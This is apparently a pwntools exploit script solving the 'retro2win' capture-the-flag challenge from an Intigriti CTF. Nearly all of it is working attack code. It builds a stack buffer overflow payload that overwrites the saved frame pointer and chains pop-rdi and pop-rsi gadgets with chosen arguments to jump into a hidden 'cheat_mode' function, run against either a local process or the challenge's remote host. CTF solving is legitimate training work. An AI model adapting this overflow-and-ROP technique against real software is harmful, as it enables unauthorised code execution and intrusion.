#!/usr/bin/python3

from pwn import *

context.log_level = 'debug' 
exe = context.binary = ELF('./retro2win', checksec=False)


# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

    b *0x400829
    c
''')

p = remote('retro2win.ctf.intigriti.io',1338) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB: 
    GDB()
    input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================



pop_rdi = 0x4009b3
pop_rsi = 0x4009b1
cheat_mode = 0x400736
dummy_value = 0x4242424242424242

pay = b'A' * 16   # fill in buffer
pay += b'B' * 8   # overwrite saved rbp
pay += p64(pop_rdi) + p64(0x2323232323232323)
pay += p64(pop_rsi) + p64(0x4242424242424242) + p64(dummy_value)
pay += p64(cheat_mode)

sla(b'option:', b'1337')
sla(b'cheatcode:', pay)

p.interactive()

